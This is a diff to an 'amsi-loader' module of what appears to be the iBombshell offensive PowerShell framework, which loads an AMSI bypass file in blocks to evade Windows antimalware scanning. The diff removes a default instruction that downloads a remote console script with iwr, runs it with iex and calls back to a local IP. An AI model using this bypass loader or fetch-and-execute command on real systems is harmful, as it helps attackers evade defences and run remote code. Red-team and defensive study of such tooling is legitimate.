@@ -1,3 +1,4 @@
+import base64
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import re
 from threading import Thread
@@ -72,18 +73,17 @@ class CustomModule(Module):
     def __init__(self):
         information = {
             "Name": "amsi-loader",
-            "Description": "AMSI bypass script loader",
+            "Description": "AMSI bypass script loader. This script is capable of loading an AMSI bypass file in blocks. The size of each block is defined by a file containing line numbers. It can be used to download the iBombshell console and generate a new warrior. To achieve this, the 'generate/powershell' module should be used, and the command should be pasted into the instruction option.",
             "Author": "@pilarclares"
         }
 
         options = {
             "ip": [None, "Local IP (Where the file is located)", True],
             "port": ["8082", "Server port", True],
-            "destination": ["$env:TEMP\\amlo", "Directory with the files", True],
+            "destination": ["$env:TMP\\amlo", "Directory with the files", True],
             "filePath": [None, "Path to the bypass file", True],
             "lineNumbers": [None, "Path to the file containing line numbers for blocks", True],
-            "instruction": ["(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/Telefonica/ibombshell/master/console').Content | iex; console -Silently -uriConsole http://192.168.56.5:8080", 
-            		"Instruction to execute after AMSI bypass", False]
+            "instruction": [None, "Instruction to execute after bypass AMSI", False]
         }
 
         super(CustomModule, self).__init__(information, options)
